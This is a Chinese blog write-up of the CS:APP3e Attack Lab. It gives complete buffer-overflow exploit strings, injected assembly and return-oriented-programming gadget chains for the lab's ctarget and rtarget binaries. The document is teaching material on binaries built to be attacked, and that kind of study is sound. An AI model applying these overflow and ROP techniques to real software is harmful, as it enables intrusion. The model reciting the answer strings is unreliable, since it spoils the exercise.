---
layout: post
title: CS:APP3e-labs Attack Lab 解题报告
tags:
- Assembly
- Operating system
categories: CSAPP
---

从这个lab开始，你在看完书本的内容后，还得仔细看一下材料自带的讲义，不看的话估计不知道从何下手。<br/>
这个lab就非常有趣了，任务要求我们去实现对两个程序的缓冲区溢出攻击，分别涉及代码注入攻击和返回导向编程攻击，总体来说难度并不是很大。<br/>
这个lab很好的向我们说明了诸如`gets()`这类函数的危险性有多大。

## Attack lab 简介

github地址：[Attack Lab](https://github.com/zxc479773533/CS-APP3e-labs/tree/master/attacklab)


### 文件说明

lab给出的文件如下：

* ctarget: 我们要执行代码注入攻击的程序
* rtarget: 我们要执行返回导向编程攻击的程序
* cookie.txt: 类似id一样的东西，当然自学材料都是一样的
* farm.c: 一些gadget的源码
* hex2raw: 把十六进制值转换成攻击字符的工具

### 目标程序

```
1 unsigned getbuf()
2 {
3      char buf[BUFFER_SIZE];
4      Gets(buf);
5      return 1;
6 }
```

如上，其中`Gets`是一个实现类似`gets`的函数，问题就出在这里，它只会读到换行符或者EOF为止，把读到的内容存储在缓冲区。我们就可以输入恶意的字符串，让缓冲区溢出之后，覆盖返回的地址，从而让程序跳转到我们想让它执行的为止，以实现攻击的目的。

getbuf在函数test内调用，test的源码如下：

```
1 void test()
2 {
3      int val;
4      val = getbuf();
5      printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```

然后讲义告诉我们程序内三关的执行函数分别是`touch1`，`touch2`，`touch3`

### 注入的方式

首先我们需要建立两个文件，一个用来写十六进制的值，另一个用来做输出。例如，首先将十六进制的值写在`exploit.txt`文件内。然后执行：

```
sh$ ./hex2raw < exploit.txt > exploit-raw.txt
```

这样攻击的字符串就生成在`exploit-raw.txt`中了，再利用：

```
sh$ ./ctarget -qi exploit-raw.txt
```

就把`exploit-raw.txt`中的内容输入到了程序。

***注意：一定要带上-q选项，否则会因为本来要向CMU的服务器提交信息，然而这里并不是CMU的缘故，导致程序无法打开***

好了，接下来开始实验。

## Code Injection Attacks 代码注入攻击

代码注入攻击，就是利用缓冲区溢出，让我们输入的值覆盖函数的返回值，使程序跳转到我们注入的代码部分（这里注入的代码指的是汇编指令），让程序执行我们想让他执行的事情。

### Level 1

第一关的函数是这样的：

```
1 void touch1()
2 {
3      vlevel = 1; /* Part of validation protocol */
4      printf("Touch1!: You called touch1()\n");
5      validate(1);
6      exit(0);
7 }
```

任务非常简单，我们只需要让touch1函数执行即可。

首先第一步，我们得知道，这个缓冲区到底有多长。测试如下：

```
sh$ ./ctarget -q
Cookie: 0x59b997fa
Type string:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
No exploit.  Getbuf returned 0x1
Normal return

sh$ ./ctarget -q
Cookie: 0x59b997fa
Type string:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Oops!: You executed an illegal instruction
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:ctarget:0:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61

sh$ ./ctarget -q
Cookie: 0x59b997fa
Type string:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                                     
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:ctarget:0:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
```

我们发现，在输入39个字符时没有问题，在输入40个字符时出现了程序走到了不合法的位置。在输入41个字符的时候出现了段错误。结合字符串最后还有一个字符`\0`，于是我们的缓冲区长度应该是40。在接下来的尝试中，我们只需要把没有用的部分填充，比如用`a`，然后再在合适的位置进行操作即可。

回到正题，通过在gdb调试器中执行`disas touch1`，得到touch1的地址`0x4017c0`，于是我们的答案就出来了，直接前面40个随意填充，后面跟上`touch1`的地址即可，答案就是：

```
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
c0 17 40
```

注意这里的语序问题，按照小端序逆着来写。

### Level 2

第二关的函数是`touch2`，讲义上它的代如下：

```
1 void touch2(unsigned val)
2 {
3      vlevel = 2; /* Part of validation protocol */
4      if (val == cookie) {
5      printf("Touch2!: You called touch2(0x%.8x)\n", val);
6      validate(2);
7      } else {
8          printf("Misfire: You called touch2(0x%.8x)\n", val);
9          fail(2);
10     }
11     exit(0);
12 }
```

这里`touch2`比之前多了一个参数，而且还要求这个参数是你的cookie的值才能通过。

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
```

我们查看一下`touch2`的汇编代码后发现，第16行这里是在拿cookie的值和`%edi`中的值作比较，于是问题的关键就在于如何把cookie的值赋给`%edi`。这就需要我们自己注入代码了。

新建一个文件`phase2.s`：

```s
# to solve the level 2 of Code Injection Attacks
mov $0x59b997fa, %rdi # set cookie in %rdi
push $0x4017ec
ret
```

这部分的代码首先把自己cookie的值赋给了`%rdi`，然后把`touch2`的地址放入栈中，ret指令执行后刚好跳转到`touch2`，从而达到目的。

接下来执行`gcc -c phase2.s`得到`.o`的文件，然后执行`objdump -d phase2.o`得到十六进制的代码。

```
phase2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq 
```

我们可以把这部分直接填充到缓冲区开始的地方，然后利用gdb得到缓冲区开始的地址`0x5561dc78`，把这个地址填到从41位置开始之后的地方即可。

于是本关的答案如下：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
78 dc 61 55
```

### Level 3

首先仍然是讲义中给出的代码：

```
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4      char cbuf[110];
5      /* Make position of check string unpredictable */
6      char *s = cbuf + random() % 100;
7      sprintf(s, "%.8x", val);
8      return strncmp(sval, s, 9) == 0;
9 }
7
10
11 void touch3(char *sval)
12 {
13     vlevel = 3; /* Part of validation protocol */
14     if (hexmatch(cookie, sval)) {
15         printf("Touch3!: You called touch3(\"%s\")\n", sval);
16         validate(3);
17     } else {
18         printf("Misfire: You called touch3(\"%s\")\n", sval);
19         fail(3);
20     }
21     exit(0);
22 }
```

`touch3`中要求`hexmatch`函数的返回值不为0，分析`hexmatch`后其实也就是要我们的参数是cookie不含0x的字符串，查看`hexmatch`的汇编代码，发现仍然的要把值赋给`%rdi`，只不过这时候我们要传递给它的是字符串的首地址。

我们把字符串放在了一开始的返回地址的后面，然后写出`phase3.s`：

```s
# to solve the level 3 of Code Injection Attacks
mov $0x5561dca8, %rdi # set string address in %rdi
push $0x4018fa
ret
```

这里是把字符串的首地址赋给了`%rdi`，然后其他就是和上一关一样的操作了。

于是本关的答案就是：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

## Return-Oriented Programming 返回导向编程攻击

这里我们要面对稍微安全一些的程序，`rtarget`使用了两个策略来阻止代码注入：

* 栈的地址是随机的，每次运行的时候都不一样，这样我们就不能想办法在栈中特定地址存放需要的值。
* 栈是不可执行的，即使我们插入了代码，也会出现segmentation fault而中断程序。

但是这样的措施并难不倒真正攻击的黑客们，他们会想方设法从程序中找到恰好能代表某些指令的代码，然后利用这些程序本身就有的代码，来实现对程序的破解。

例如我们有如下的几个对照表，给出了一些常见的赋值之类的操作对应的十六进制值。

![](https://raw.githubusercontent.com/zxc479773533/zxc479773533.github.io/master/_posts/images/Attack-Lab-01.png)

![](https://raw.githubusercontent.com/zxc479773533/zxc479773533.github.io/master/_posts/images/Attack-Lab-02.png)

此外再补充一个指令：nop，没有任何操作，对应字节是`0x90`

这里为了方便我们熟悉，程序中也专门给出了一些gadget，供我们来寻找能用的代码。

执行`objdump -d rtarget > rtarget.asm`，得到的文件中，有这么一段：

```s
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   

00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq   

00000000004019e1 <setval_296>:
  4019e1:	c7 07 99 d1 90 90    	movl   $0x9090d199,(%rdi)
  4019e7:	c3                   	retq   

00000000004019e8 <addval_113>:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq   

00000000004019ef <addval_490>:
  4019ef:	8d 87 8d d1 20 db    	lea    -0x24df2e73(%rdi),%eax
  4019f5:	c3                   	retq   

00000000004019f6 <getval_226>:
  4019f6:	b8 89 d1 48 c0       	mov    $0xc048d189,%eax
  4019fb:	c3                   	retq   

00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	retq   

0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq   

0000000000401a0a <setval_276>:
  401a0a:	c7 07 88 c2 08 c9    	movl   $0xc908c288,(%rdi)
  401a10:	c3                   	retq   

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

0000000000401a18 <getval_345>:
  401a18:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401a1d:	c3                   	retq   

0000000000401a1e <addval_479>:
  401a1e:	8d 87 89 c2 00 c9    	lea    -0x36ff3d77(%rdi),%eax
  401a24:	c3                   	retq   

0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq   

0000000000401a2c <setval_248>:
  401a2c:	c7 07 81 ce 08 db    	movl   $0xdb08ce81,(%rdi)
  401a32:	c3                   	retq   

0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq   

0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq   

0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq   

0000000000401a47 <addval_201>:
  401a47:	8d 87 48 89 e0 c7    	lea    -0x381f76b8(%rdi),%eax
  401a4d:	c3                   	retq   

0000000000401a4e <getval_272>:
  401a4e:	b8 99 d1 08 d2       	mov    $0xd208d199,%eax
  401a53:	c3                   	retq   

0000000000401a54 <getval_155>:
  401a54:	b8 89 c2 c4 c9       	mov    $0xc9c4c289,%eax
  401a59:	c3                   	retq   

0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	retq   

0000000000401a61 <addval_404>:
  401a61:	8d 87 89 ce 92 c3    	lea    -0x3c6d3177(%rdi),%eax
  401a67:	c3                   	retq   

0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   

0000000000401a75 <setval_328>:
  401a75:	c7 07 81 c2 38 d2    	movl   $0xd238c281,(%rdi)
  401a7b:	c3                   	retq   

0000000000401a7c <setval_450>:
  401a7c:	c7 07 09 ce 08 c9    	movl   $0xc908ce09,(%rdi)
  401a82:	c3                   	retq   

0000000000401a83 <addval_358>:
  401a83:	8d 87 08 89 e0 90    	lea    -0x6f1f76f8(%rdi),%eax
  401a89:	c3                   	retq   

0000000000401a8a <addval_124>:
  401a8a:	8d 87 89 c2 c7 3c    	lea    0x3cc7c289(%rdi),%eax
  401a90:	c3                   	retq   

0000000000401a91 <getval_169>:
  401a91:	b8 88 ce 20 c0       	mov    $0xc020ce88,%eax
  401a96:	c3                   	retq   

0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq   

0000000000401a9e <addval_184>:
  401a9e:	8d 87 89 c2 60 d2    	lea    -0x2d9f3d77(%rdi),%eax
  401aa4:	c3                   	retq   

0000000000401aa5 <getval_472>:
  401aa5:	b8 8d ce 20 d2       	mov    $0xd220ce8d,%eax
  401aaa:	c3                   	retq   

0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq   

0000000000401ab2 <end_farm>:
  401ab2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ab7:	c3                   	retq   
  401ab8:	90                   	nop
  401ab9:	90                   	nop
  401aba:	90                   	nop
  401abb:	90                   	nop
  401abc:	90                   	nop
  401abd:	90                   	nop
  401abe:	90                   	nop
  401abf:	90                   	nop
```

大体扫一眼，里面只有一个`add_xy`函数是个正经的能用的函数，其他的都没有什么用，我们只能从这些函数内部某一段来下手。

### lebel 2

重新开始第二关，目标仍然是执行函数`touch2`，不过这次不能在玩注入了，没法执行。

但是，不能注入归不能注入，我们利用已有的代码来凑出整个过程。

理一理，我们只需要：

* 把cookie放到`%rdi`中
* 把`touch2`的地址放到栈中
* ret开始执行

仔细找了半天并没有发现有可以直接把值赋给`%rdi`的，但是我们找到了这样一个函数：

```s
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3    
```

中间有一段 `48 89 c7 c3` 这正好是`%rax`的值赋值给`%rdi`，并且`c3`代表`ret`刚好就是返回，我们可以在这后面写上`touch2`开始的地址。

接着找有没有给`%rax`赋值的语句，结果发现：

```s
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   
```

注意到上面这个函数中，有一段 `58 90 c3`，是一个`popq %rax`指令，于是答案就出来了。

```
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
cc 19 40 00 00 00 00 00 # 进入58 90 c3的地方
fa 97 b9 59 00 00 00 00 # cookie的值，由上面的语句被压入栈中
a2 19 40 00 00 00 00 00 # 进入48 89 c7 c3的地方
ec 17 40 00 00 00 00 00 # touch2开始的地址
```

当然，这种类型的题目答案是不唯一的。

### level 3

同样是要执行`touch3`但是这一次我们不能直接把字符串随便放在栈中，因为我们拿不到准确的地址。但是，虽然地址的值在变，但是相对的位置是不会变的，这就为我们找到了突破口。我们应该设置一个偏移量，利用当前`%rsp`的值加上偏移量来获取字符串。

理一理思路：

* 首先应该是拿到现在`%rsp`的地址，用作找到字符串
* 把这个地址加上偏移量，这里是`0x48`，刚好用到`add_xy`函数
* 想办法把上面的那个值放到`%rdi`中
* 跟上一个`ret`指令，返回`touch3`的地址
* 存放字符串，方便起见我们放到了最后

实际操作的时候，第三步是需要中转的，因为gadget farm中提供的代码是有限的，利用其他的寄存器中转，来最终将值放到`%rdi`中。

答案如下，中间的过程就不在详细解释了，方法和上一关一样的，在工具中慢慢找能用的代码吧。

```
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00 # 偏移量72，这个需要我们计算好
20 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00 # touch3的地址
35 39 62 39 39 37 66 61 # cookie字符串
00
```

## 总结

这次lab向我们介绍了两种缓冲区溢出的攻击方式，也让我们自己体验了一回破解程序的快感，同时也加深了我们对运行时栈的理解等等。整个过程如果照着讲义来做也还是比较简单的。

本书对于汇编部分的lab就到这里了，暂时跳过第四章处理器体系结构，先搞优化的部分。